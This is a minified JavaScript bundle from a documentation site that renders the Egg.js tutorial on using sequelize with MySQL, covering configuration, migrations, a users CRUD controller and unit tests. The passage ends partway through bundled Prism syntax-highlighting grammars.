0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},OTtR:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./mysql"},"In the previous section"),", we showed how to access the database through the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," plugin in the framework. In some more complex applications, we may need an ORM framework to help us manage the data layer code. In the Node.js community, ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/"},"sequelize")," is a widely used ORM framework that supports multiple data sources such as MySQL, PostgreSQL, SQLite, and MSSQL."),r.a.createElement("p",null,"In this chapter, we will walk through the steps of how to use sequelize in an egg project by developing an example of doing CURD on the data in the ",r.a.createElement("code",null,"users")," table in MySQL."),r.a.createElement("h2",{id:"preparing"},r.a.createElement(l["AnchorLink"],{to:"#preparing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Preparing"),r.a.createElement("p",null,"In this example, we will use sequelize to connect to the MySQL data source, so we need to install MySQL on the machine before we start writing code. If it is MacOS, we can quickly install it via homebrew:"),r.a.createElement(o["a"],{code:"brew install mysql\nbrew services start mysql",lang:"bash"}),r.a.createElement("h2",{id:"initialization"},r.a.createElement(l["AnchorLink"],{to:"#initialization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Initialization"),r.a.createElement("p",null,"Init project by ",r.a.createElement("code",null,"npm"),":"),r.a.createElement(o["a"],{code:"$ mkdir sequelize-project && cd sequelize-project\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("p",null,"Install and configure the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," plugin (which will help us load the defined Model object onto ",r.a.createElement("code",null,"app")," and ",r.a.createElement("code",null,"ctx")," ) and the ",r.a.createElement(l["Link"],{to:"https://github.com/sidorares/node-mysql2"},"mysql2")," module:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Install")),r.a.createElement(o["a"],{code:"npm install --save egg-sequelize mysql2",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Import egg-sequelize in ",r.a.createElement("code",null,"config/plugin.js"))),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  enable: true,\n  package: 'egg-sequelize',\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Write the sequelize configuration in ",r.a.createElement("code",null,"config/config.default.js"))),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  dialect: 'mysql',\n  host: '127.0.0.1',\n  port: 3306,\n  database: 'egg-sequelize-doc-default',\n};",lang:"js"}),r.a.createElement("p",null,"We can configure different data source addresses in different environment configurations to distinguish the databases used by different environments. For example, we can create a new ",r.a.createElement("code",null,"config/config.unittest.js")," configuration file and write the following configuration. The connected database points to ",r.a.createElement("code",null,"egg-sequelize-doc-unittest"),"."),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  dialect: 'mysql',\n  host: '127.0.0.1',\n  port: 3306,\n  database: 'egg-sequelize-doc-unittest',\n};",lang:"js"}),r.a.createElement("p",null,"After completing the above configuration, a project using sequelize is initialized. ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," and ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/"},"sequelize")," also support more configuration items, which can be found in their documentation."),r.a.createElement("h2",{id:"database-and-migrations-initialization"},r.a.createElement(l["AnchorLink"],{to:"#database-and-migrations-initialization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Database and Migrations Initialization"),r.a.createElement("p",null,"Next, let's temporarily leave the code of the egg project, design and initialize our database. First, we quickly create two databases for development and testing locally using the mysql command:"),r.a.createElement(o["a"],{code:"mysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-default`;'\nmysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-unittest`;'",lang:"bash"}),r.a.createElement("p",null,"Then we started designing the ",r.a.createElement("code",null,"users")," table, which has the following data structure:"),r.a.createElement(o["a"],{code:"CREATE TABLE `users` (\n  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'primary key',\n  `name` varchar(30) DEFAULT NULL COMMENT 'user name',\n  `age` int(11) DEFAULT NULL COMMENT 'user age',\n  `created_at` datetime DEFAULT NULL COMMENT 'created time',\n  `updated_at` datetime DEFAULT NULL COMMENT 'updated time',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='user';",lang:"sql"}),r.a.createElement("p",null,"We can build the table directly through the mysql command, but this is not a good practice for multiplayer collaboration. During the evolution of the project, each iteration is possible to make changes to the database data structure, how to track the data changes of each iteration, and quickly change the data structure in different environments (development, testing, CI) and switch bettween iterative? At this point we need ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/manual/tutorial/migrations.html"},"Migrations")," to help us manage the changes in the data structure."),r.a.createElement("p",null,"Sequelize provides the ",r.a.createElement(l["Link"],{to:"https://github.com/sequelize/cli"},"sequelize-cli")," tool to implement ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/manual/tutorial/migrations.html"},"Migrations"),", and we can also introduce sequelize-cli in the egg project."),r.a.createElement("ul",null,r.a.createElement("li",null,"Install ",r.a.createElement("code",null,"sequelize-cli"))),r.a.createElement(o["a"],{code:"npm install --save-dev sequelize-cli",lang:"bash"}),r.a.createElement("p",null,"In the egg project, we want to put all the database Migrations related content in the ",r.a.createElement("code",null,"database")," directory, so we create a new ",r.a.createElement("code",null,".sequelizerc")," configuration file in the project root directory:"),r.a.createElement(o["a"],{code:"'use strict';\n\nconst path = require('path');\n\nmodule.exports = {\n  config: path.join(__dirname, 'database/config.json'),\n  'migrations-path': path.join(__dirname, 'database/migrations'),\n  'seeders-path': path.join(__dirname, 'database/seeders'),\n  'models-path': path.join(__dirname, 'app/model'),\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Init Migrations Configuration Files and Directories")),r.a.createElement(o["a"],{code:"npx sequelize init:config\nnpx sequelize init:migrations",lang:"bash"}),r.a.createElement("p",null,"After the execution, the ",r.a.createElement("code",null,"database/config.json")," file and the ",r.a.createElement("code",null,"database/migrations")," directory will be generated. We will modify the contents of ",r.a.createElement("code",null,"database/config.json"),". It was changed to the database configuration used in our project:"),r.a.createElement(o["a"],{code:'{\n  "development": {\n    "username": "root",\n    "password": null,\n    "database": "egg-sequelize-doc-default",\n    "host": "127.0.0.1",\n    "dialect": "mysql"\n  },\n  "test": {\n    "username": "root",\n    "password": null,\n    "database": "egg-sequelize-doc-unittest",\n    "host": "127.0.0.1",\n    "dialect": "mysql"\n  }\n}',lang:"unknown"}),r.a.createElement("p",null,"At this point sequelize-cli and related configuration are also initialized, we can start writing the project's first Migration file to create one of our ",r.a.createElement("code",null,"users")," table."),r.a.createElement(o["a"],{code:"npx sequelize migration:generate --name=init-users",lang:"bash"}),r.a.createElement("p",null,"After execution, a migration file (",r.a.createElement("code",null,"$","{","timestamp","}","-init-users.js"),") is generated in the ",r.a.createElement("code",null,"database/migrations")," directory. We modify it to handle initializing the ",r.a.createElement("code",null,"users")," table:"),r.a.createElement(o["a"],{code:"'use strict';\n\nmodule.exports = {\n  // The function called when performing a database upgrade, create a `users` table\n  up: async (queryInterface, Sequelize) => {\n    const { INTEGER, DATE, STRING } = Sequelize;\n    await queryInterface.createTable('users', {\n      id: { type: INTEGER, primaryKey: true, autoIncrement: true },\n      name: STRING(30),\n      age: INTEGER,\n      created_at: DATE,\n      updated_at: DATE,\n    });\n  },\n  // The function called when performing a database downgrade, delete the `users` table\n  down: async (queryInterface) => {\n    await queryInterface.dropTable('users');\n  },\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Execute migrate for database changes")),r.a.createElement(o["a"],{code:"# upgrade database\nnpx sequelize db:migrate\n# if there is a problem that needs to be rolled back, you can roll back a change via `db:migrate:undo`\n# npx sequelize db:migrate:undo\n# can be rolled back to the initial state via `db:migrate:undo:all`\n# npx sequelize db:migrate:undo:all",lang:"bash"}),r.a.createElement("p",null,"After execution, our database initialization is complete."),r.a.createElement("h2",{id:"coding"},r.a.createElement(l["AnchorLink"],{to:"#coding","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Coding"),r.a.createElement("p",null,"Finally we can start writing code to implement business logic. First, let's write the user model in the ",r.a.createElement("code",null,"app/model/")," directory:"),r.a.createElement(o["a"],{code:"'use strict';\n\nmodule.exports = (app) => {\n  const { STRING, INTEGER, DATE } = app.Sequelize;\n\n  const User = app.model.define('user', {\n    id: { type: INTEGER, primaryKey: true, autoIncrement: true },\n    name: STRING(30),\n    age: INTEGER,\n    created_at: DATE,\n    updated_at: DATE,\n  });\n\n  return User;\n};",lang:"js"}),r.a.createElement("p",null,"This model can be accessed in the Controller and Service via ",r.a.createElement("code",null,"app.model.User")," or ",r.a.createElement("code",null,"ctx.model.User"),", for example we write ",r.a.createElement("code",null,"app/controller/users.js"),":"),r.a.createElement(o["a"],{code:"// app/controller/users.js\nconst Controller = require('egg').Controller;\n\nfunction toInt(str) {\n  if (typeof str === 'number') return str;\n  if (!str) return str;\n  return parseInt(str, 10) || 0;\n}\n\nclass UserController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    const query = {\n      limit: toInt(ctx.query.limit),\n      offset: toInt(ctx.query.offset),\n    };\n    ctx.body = await ctx.model.User.findAll(query);\n  }\n\n  async show() {\n    const ctx = this.ctx;\n    ctx.body = await ctx.model.User.findByPk(toInt(ctx.params.id));\n  }\n\n  async create() {\n    const ctx = this.ctx;\n    const { name, age } = ctx.request.body;\n    const user = await ctx.model.User.create({ name, age });\n    ctx.status = 201;\n    ctx.body = user;\n  }\n\n  async update() {\n    const ctx = this.ctx;\n    const id = toInt(ctx.params.id);\n    const user = await ctx.model.User.findByPk(id);\n    if (!user) {\n      ctx.status = 404;\n      return;\n    }\n\n    const { name, age } = ctx.request.body;\n    await user.update({ name, age });\n    ctx.body = user;\n  }\n\n  async destroy() {\n    const ctx = this.ctx;\n    const id = toInt(ctx.params.id);\n    const user = await ctx.model.User.findByPk(id);\n    if (!user) {\n      ctx.status = 404;\n      return;\n    }\n\n    await user.destroy();\n    ctx.status = 200;\n  }\n}\n\nmodule.exports = UserController;",lang:"js"}),r.a.createElement("p",null,"Finally we will mount this controller on the route:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.resources('users', '/users', controller.users);\n};",lang:"js"}),r.a.createElement("p",null,"The interface for the CURD operation of the ",r.a.createElement("code",null,"users")," table is developed. To verify that the code logic is correct, we need to write some testcases to verify."),r.a.createElement("h2",{id:"unit-test"},r.a.createElement(l["AnchorLink"],{to:"#unit-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Unit Test"),r.a.createElement("p",null,"Before writing the test, because in the previous egg configuration, we pointed the unit test environment and development environment to different databases, so we need to initialize the data structure of the test database through Migrations:"),r.a.createElement(o["a"],{code:"NODE_ENV=test npx sequelize db:migrate:up",lang:"bash"}),r.a.createElement("p",null,"Unit tests with database access are particularly cumbersome to write directly, We need to create a series of data to prepare the test data is a very cumbersome process. To simplify single testing, we can quickly create test data with the ",r.a.createElement(l["Link"],{to:"https://github.com/aexmachina/factory-girl"},"factory-girl")," module."),r.a.createElement("ul",null,r.a.createElement("li",null,"Install ",r.a.createElement("code",null,"factory-girl"))),r.a.createElement(o["a"],{code:"npm install --save-dev factory-girl",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Define the data model of factory-girl into ",r.a.createElement("code",null,"test/factories.js"))),r.a.createElement(o["a"],{code:"// test/factories.js\n'use strict';\n\nconst { factory } = require('factory-girl');\n\nmodule.exports = (app) => {\n  // Factory instance can be accessed via app.factory\n  app.factory = factory;\n\n  // Define user and default data\n  factory.define('user', app.model.User, {\n    name: factory.sequence('User.name', (n) => `name_${n}`),\n    age: 18,\n  });\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Initialize the file ",r.a.createElement("code",null,"test/.setup.js"),", introduce the factory, and ensure that the data is cleaned after the test is executed to avoid being affected.")),r.a.createElement(o["a"],{code:"const { app } = require('egg-mock/bootstrap');\nconst factories = require('./factories');\n\nbefore(() => factories(app));\nafterEach(async () => {\n  // clear database after each test case\n  await Promise.all([app.model.User.destroy({ truncate: true, force: true })]);\n});",lang:"js"}),r.a.createElement("p",null,"Then we can start writing real test cases:"),r.a.createElement(o["a"],{code:"// test/app/controller/users.test.js\nconst { assert, app } = require('egg-mock/bootstrap');\n\ndescribe('test/app/controller/users.test.js', () => {\n  describe('GET /users', () => {\n    it('should work', async () => {\n      // Quickly create some users object into the database via factory-girl\n      await app.factory.createMany('user', 3);\n      const res = await app.httpRequest().get('/users?limit=2');\n      assert(res.status === 200);\n      assert(res.body.length === 2);\n      assert(res.body[0].name);\n      assert(res.body[0].age);\n    });\n  });\n\n  describe('GET /users/:id', () => {\n    it('should work', async () => {\n      const user = await app.factory.create('user');\n      const res = await app.httpRequest().get(`/users/${user.id}`);\n      assert(res.status === 200);\n      assert(res.body.age === user.age);\n    });\n  });\n\n  describe('POST /users', () => {\n    it('should work', async () => {\n      app.mockCsrf();\n      let res = await app.httpRequest().post('/users').send({\n        age: 10,\n        name: 'name',\n      });\n      assert(res.status === 201);\n      assert(res.body.id);\n\n      res = await app.httpRequest().get(`/users/${res.body.id}`);\n      assert(res.status === 200);\n      assert(res.body.name === 'name');\n    });\n  });\n\n  describe('DELETE /users/:id', () => {\n    it('should work', async () => {\n      const user = await app.factory.create('user');\n\n      app.mockCsrf();\n      const res = await app.httpRequest().delete(`/users/${user.id}`);\n      assert(res.status === 200);\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Finally, if we need to run unit tests in the CI, we need to ensure that we perform a migration to ensure data structure updates before executing the test code. For example, we declare ",r.a.createElement("code",null,"scripts.ci")," in ",r.a.createElement("code",null,"package.json")," to execute the unit test in the CI environment:"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "ci": "eslint . && NODE_ENV=test npx sequelize db:migrate && egg-bin cov"\n  }\n}',lang:"js"}),r.a.createElement("h2",{id:"full-example"},r.a.createElement(l["AnchorLink"],{to:"#full-example","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Full Example"),r.a.createElement("p",null,"A more complete example can be found in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/sequelize"},"eggjs/examples/sequelize"),"."),r.a.createElement("h2",{id:"boilerplate"},r.a.createElement(l["AnchorLink"],{to:"#boilerplate","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Boilerplate"),r.a.createElement("p",null,"We also provide sequelize boilerplate that integrates the modules ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize"),", ",r.a.createElement(l["Link"],{to:"https://github.com/sequelize/cli"},"sequelize-cli")," and ",r.a.createElement(l["Link"],{to:"https://github.com/aexmachina/factory-girl"},"factory-girl")," provided in this documentation. You can quickly initialize a new application based on it by ",r.a.createElement("code",null,"npm init egg --type=sequelize"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},Oa2w:function(e,t,n){"use strict";var a=n("m/os"),r=n("wzTy"),l=n("N0Us");e.exports=function(e){var t=a(this),n=l(t.length),o=arguments.length,i=r(o>1?arguments[1]:void 0,n),c=o>2?arguments[2]:void 0,s=void 0===c?n:r(c,n);while(s>i)t[i++]=e;return t}},Oaqu:function(e,t,n){var a=n("QiLd");a("flat")},OhDZ:function(e,t,n){var a=n("WM7W");a("search")},OwS2:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"this document is still waiting for translation, see ",r.a.createElement(l["Link"],{to:"/zh-CN/tutorials/assets"},"Chinese Version"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},"P/fr":function(e,t,n){"use strict";var a=n("FU0I"),r=n.n(a),l=function(){var e=/(?:^|\s)lang(?:uage)?-([\w-]+)(?=\s|$)/i,t=0,n={},a={util:{encode:function e(t){return t instanceof r?new r(t.type,e(t.content),t.alias):Array.isArray(t)?t.map(e):t.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(e){return Object.prototype.toString.call(e).slice(8,-1)},objId:function(e){return e["__id"]||Object.defineProperty(e,"__id",{value:++t}),e["__id"]},clone:function e(t,n){var r,l;switch(n=n||{},a.util.type(t)){case"Object":if(l=a.util.objId(t),n[l])return n[l];for(var o in r={},n[l]=r,t)t.hasOwnProperty(o)&&(r[o]=e(t[o],n));return r;case"Array":return l=a.util.objId(t),n[l]?n[l]:(r=[],n[l]=r,t.forEach((function(t,a){r[a]=e(t,n)})),r);default:return t}},getLanguage:function(t){while(t){var n=e.exec(t.className);if(n)return n[1].toLowerCase();t=t.parentElement}return"none"},setLanguage:function(t,n){t.className=t.className.replace(RegExp(e,"gi"),""),t.classList.add("language-"+n)},isActive:function(e,t,n){var a="no-"+t;while(e){var r=e.classList;if(r.contains(t))return!0;if(r.contains(a))return!1;e=e.parentElement}return!!n}},languages:{plain:n,plaintext:n,text:n,txt:n,extend:function(e,t){var n=a.util.clone(a.languages[e]);for(var r in t)n[r]=t[r];return n},insertBefore:function(e,t,n,r){r=r||a.languages;var l=r[e],o={};for(var i in l)if(l.hasOwnProperty(i)){if(i==t)for(var c in n)n.hasOwnProperty(c)&&(o[c]=n[c]);n.hasOwnProperty(i)||(o[i]=l[i])}var s=r[e];return r[e]=o,a.languages.DFS(a.languages,(function(t,n){n===s&&t!=e&&(this[t]=o)})),o},DFS:function e(t,n,r,l){l=l||{};var o=a.util.objId;for(var i in t)if(t.hasOwnProperty(i)){n.call(t,i,t[i],r||i);var c=t[i],s=a.util.type(c);"Object"!==s||l[o(c)]?"Array"!==s||l[o(c)]||(l[o(c)]=!0,e(c,n,i,l)):(l[o(c)]=!0,e(c,n,null,l))}}},plugins:{},highlight:function(e,t,n){var l={code:e,grammar:t,language:n};return a.hooks.run("before-tokenize",l),l.tokens=a.tokenize(l.code,l.grammar),a.hooks.run("after-tokenize",l),r.stringify(a.util.encode(l.tokens),l.language)},tokenize:function(e,t){var n=t.rest;if(n){for(var a in n)t[a]=n[a];delete t.rest}var r=new i;return c(r,r.head,e),o(e,r,t,r.head,0),u(r)},hooks:{all:{},add:function(e,t){var n=a.hooks.all;n[e]=n[e]||[],n[e].push(t)},run:function(e,t){var n=a.hooks.all[e];if(n&&n.length)for(var r,l=0;r=n[l++];)r(t)}},Token:r};function r(e,t,n,a){this.type=e,this.content=t,this.alias=n,this.length=0|(a||"").length}function l(e,t,n,a){e.lastIndex=t;var r=e.exec(n);if(r&&a&&r[1]){var l=r[1].length;r.index+=l,r[0]=r[0].slice(l)}return r}function o(e,t,n,i,u,d){for(var m in n)if(n.hasOwnProperty(m)&&n[m]){var p=n[m];p=Array.isArray(p)?p:[p];for(var h=0;h<p.length;++h){if(d&&d.cause==m+","+h)return;var g=p[h],f=g.inside,E=!!g.lookbehind,b=!!g.greedy,v=g.alias;if(b&&!g.pattern.global){var y=g.pattern.toString().match(/[imsuy]*$/)[0];g.pattern=RegExp(g.pattern.source,y+"g")}for(var k=g.pattern||g,w=i.next,x=u;w!==t.tail;x+=w.value.length,w=w.next){if(d&&x>=d.reach)break;var j=w.value;if(t.length>e.length)return;if(!(j instanceof r)){var S,C=1;if(b){if(S=l(k,x,e,E),!S||S.index>=e.length)break;var A=S.index,L=S.index+S[0].length,T=x;T+=w.value.length;while(A>=T)w=w.next,T+=w.value.length;if(T-=w.value.length,x=T,w.value instanceof r)continue;for(var N=w;N!==t.tail&&(T<L||"string"===typeof N.value);N=N.next)C++,T+=N.value.length;C--,j=e.slice(x,T),S.index-=x}else if(S=l(k,0,j,E),!S)continue;A=S.index;var O=S[0],I=j.slice(0,A),P=j.slice(A+O.length),R=x+j.length;d&&R>d.reach&&(d.reach=R);var _=w.prev;I&&(_=c(t,_,I),x+=I.length),s(t,_,C);var q=new r(m,f?a.tokenize(O,f):O,v,O);if(w=c(t,_,q),P&&c(t,w,P),C>1){var M={cause:m+","+h,reach:R};o(e,t,n,w.prev,x,M),d&&M.reach>d.reach&&(d.reach=M.reach)}}}}}}function i(){var e={value:null,prev:null,next:null},t={value:null,prev:e,next:null};e.next=t,this.head=e,this.tail=t,this.length=0}function c(e,t,n){var a=t.next,r={value:n,prev:t,next:a};return t.next=r,a.prev=r,e.length++,r}function s(e,t,n){for(var a=t.next,r=0;r<n&&a!==e.tail;r++)a=a.next;t.next=a,a.prev=t,e.length-=r}function u(e){var t=[],n=e.head.next;while(n!==e.tail)t.push(n.value),n=n.next;return t}return r.stringify=function e(t,n){if("string"==typeof t)return t;if(Array.isArray(t)){var r="";return t.forEach((function(t){r+=e(t,n)})),r}var l={type:t.type,content:e(t.content,n),tag:"span",classes:["token",t.type],attributes:{},language:n},o=t.alias;o&&(Array.isArray(o)?Array.prototype.push.apply(l.classes,o):l.classes.push(o)),a.hooks.run("wrap",l);var i="";for(var c in l.attributes)i+=" "+c+'="'+(l.attributes[c]||"").replace(/"/g,"&quot;")+'"';return"<"+l.tag+' class="'+l.classes.join(" ")+'"'+i+">"+l.content+"</"+l.tag+">"},a}(),o=l;l["default"]=l,o.languages.markup={comment:{pattern:/<!--(?:(?!<!--)[\s\S])*?-->/,greedy:!0},prolog:{pattern:/<\?[\s\S]+?\?>/,greedy:!0},doctype:{pattern:/<!DOCTYPE(?:[^>"'[\]]|"[^"]*"|'[^']*')+(?:\[(?:[^<"'\]]|"[^"]*"|'[^']*'|<(?!!--)|<!--(?:[^-]|-(?!->))*-->)*\]\s*)?>/i,greedy:!0,inside:{"internal-subset":{pattern:/(^[^\[]*\[)[\s\S]+(?=\]>$)/,lookbehind:!0,greedy:!0,inside:null},string:{pattern:/"[^"]*"|'[^']*'/,greedy:!0},punctuation:/^<!|>$|[[\]]/,"doctype-tag":/^DOCTYPE/i,name:/[^\s<>'"]+/}},cdata:{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,greedy:!0},tag:{pattern:/<\/?(?!\d)[^\s>\/=$<%]+(?:\s(?:\s*[^\s>\/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))|(?=[\s/>])))+)?\s*\/?>/,greedy:!0,inside:{tag:{pattern:/^<\/?[^\s>\/]+/,inside:{punctuation:/^<\/?/,namespace:/^[^\s>\/:]+:/}},"special-attr":[],"attr-value":{pattern:/=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+)/,inside:{punctuation:[{pattern:/^=/,alias:"attr-equals"},/"|'/]}},punctuation:/\/?>/,"attr-name":{pattern:/[^\s>\/]+/,inside:{namespace:/^[^\s>\/:]+:/}}}},entity:[{pattern:/&[\da-z]{1,8};/i,alias:"named-entity"},/&#x?[\da-f]{1,8};/i]},o.languages.markup["tag"].inside["attr-value"].inside["entity"]=o.languages.markup["entity"],o.languages.markup["doctype"].inside["internal-subset"].inside=o.languages.markup,o.hooks.add("wrap",(function(e){"entity"===e.type&&(e.attributes["title"]=e.content.replace(/&amp;/,"&"))})),Object.defineProperty(o.languages.markup.tag,"addInlined",{value:function(e,t){var n={};n["language-"+t]={pattern:/(^<!\[CDATA\[)[\s\S]+?(?=\]\]>$)/i,lookbehind:!0,inside:o.languages[t]},n["cdata"]=/^<!\[CDATA\[|\]\]>$/i;var a={"included-cdata":{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,inside:n}};a["language-"+t]={pattern:/[\s\S]+/,inside:o.languages[t]};var r={};r[e]={pattern:RegExp(/(<__[^>]*>)(?:<!\[CDATA\[(?:[^\]]|\](?!\]>))*\]\]>|(?!<!\[CDATA\[)[\s\S])*?(?=<\/__>)/.source.replace(/__/g,(function(){return e})),"i"),lookbehind:!0,greedy:!0,inside:a},o.languages.insertBefore("markup","cdata",r)}}),Object.defineProperty(o.languages.markup.tag,"addAttribute",{value:function(e,t){o.languages.markup.tag.inside["special-attr"].push({pattern:RegExp(/(^|["'\s])/.source+"(?:"+e+")"+/\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))/.source,"i"),lookbehind:!0,inside:{"attr-name":/^[^\s=]+/,"attr-value":{pattern:/=[\s\S]+/,inside:{value:{pattern:/(^=\s*(["']|(?!["'])))\S[\s\S]*(?=\2$)/,lookbehind:!0,alias:[t,"language-"+t],inside:o.languages[t]},punctuation:[{pattern:/^=/,alias:"attr-equals"},/"|'/]}}}})}}),o.languages.html=o.languages.markup,o.languages.mathml=o.languages.markup,o.languages.svg=o.languages.markup,o.languages.xml=o.languages.extend("markup",{}),o.languages.ssml=o.languages.xml,o.languages.atom=o.languages.xml,o.languages.rss=o.languages.xml,function(e){var t="\\b(?:BASH|BASHOPTS|BASH_ALIASES|BASH_ARGC|BASH_ARGV|BASH_CMDS|BASH_COMPLETION_COMPAT_DIR|BASH_LINENO|BASH_REMATCH|BASH_SOURCE|BASH_VERSINFO|BASH_VERSION|COLORTERM|COLUMNS|COMP_WORDBREAKS|DBUS_SESSION_BUS_ADDRESS|DEFAULTS_PATH|DESKTOP_SESSION|DIRSTACK|DISPLAY|EUID|GDMSESSION|GDM_LANG|GNOME_KEYRING_CONTROL|GNOME_KEYRING_PID|GPG_AGENT_INFO|GROUPS|HISTCONTROL|HISTFILE|HISTFILESIZE|HISTSIZE|HOME|HOSTNAME|HOSTTYPE|IFS|INSTANCE|JOB|LANG|LANGUAGE|LC_ADDRESS|LC_ALL|LC_IDENTIFICATION|LC_MEASUREMENT|LC_MONETARY|LC_NAME|LC_NUMERIC|LC_PAPER|LC_TELEPHONE|LC_TIME|LESSCLOSE|LESSOPEN|LINES|LOGNAME|LS_COLORS|MACHTYPE|MAILCHECK|MANDATORY_PATH|NO_AT_BRIDGE|OLDPWD|OPTERR|OPTIND|ORBIT_SOCKETDIR|OSTYPE|PAPERSIZE|PATH|PIPESTATUS|PPID|PS1|PS2|PS3|PS4|PWD|RANDOM|REPLY|SECONDS|SELINUX_INIT|SESSION|SESSIONTYPE|SESSION_MANAGER|SHELL|SHELLOPTS|SHLVL|SSH_AUTH_SOCK|TERM|UID|UPSTART_EVENTS|UPSTART_INSTANCE|UPSTART_JOB|UPSTART_SESSION|USER|WINDOWID|XAUTHORITY|XDG_CONFIG_DIRS|XDG_CURRENT_DESKTOP|XDG_DATA_DIRS|XDG_GREETER_DATA_DIR|XDG_MENU_PREFIX|XDG_RUNTIME_DIR|XDG_SEAT|XDG_SEAT_PATH|XDG_SESSION_DESKTOP|XDG_SESSION_ID|XDG_SESSION_PATH|XDG_SESSION_TYPE|XDG_VTNR|XMODIFIERS)\\b",n={pattern:/(^(["']?)\w+\2)[ \t]+\S.*/,lookbehind:!0,alias:"punctuation",inside:null},a={bash:n,environment:{pattern:RegExp("\\$"+t),alias:"constant"},variable:[{pattern:/\$?\(\([\s\S]+?\)\)/,greedy:!0,inside:{variable:[{pattern:/(^\$\(\([\s\S]+)\)\)/,lookbehind:!0},/^\$\(\(/],number:/\b0x[\dA-Fa-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:[Ee]-?\d+)?/,operator:/--|\+\+|\*\*=?|<<=?|>>=?|&&|\|\||[=!+\-*/%<>^&|]=?|[?~:]/,punctuation:/\(\(?|\)\)?|,|;/}},{pattern:/\$\((?:\([^)]+\)|[^()])+\)|`[^`]+`/,greedy:!0,inside:{variable:/^\$\(|^`|\)$|`$/}},{pattern:/\$\{[^}]+\}/,greedy:!0,inside:{operator:/:[-=?+]?|[!\/]|##?|%%?|\^\^?|,,?/,punctuation:/[\[\]]/,environment:{pattern:RegExp("(\\{)"+t),lookbehind:!0,alias:"constant"}}},/\$(?:\w+|[#?*!@$])/],entity:/\\(?:[abceEfnrtv\\"]|O?[0-7]{1,3}|U[0-9a-fA-F]{8}|u[0-9a-fA-F]{4}|x[0-9a-fA-F]{1,2})/};e.languages.bash={shebang:{pattern:/^#!\s*\/.*/,alias:"important"},comment:{pattern:/(^|[^"{\\$])#.*/,lookbehind:!0},"function-name":[{pattern:/(\bfunction\s+)[\w-]+(?=(?:\s*\(?:\s*\))?\s*\{)/,lookbehind:!0,alias:"function"},{pattern:/\b[\w-]+(?=\s*\(\s*\)\s*\{)/,alias:"function"}],"for-or-select":{pattern:/(\b(?:for|select)\s+)\w+(?=\s+in\s)/,alias:"variable",lookbehind:!0},"assign-left":{pattern:/(^|[\s;|&]|[<>]\()\w+(?=\+?=)/,inside:{environment:{pattern:RegExp("(^|[\\s;|&]|[<>]\\()"+t),lookbe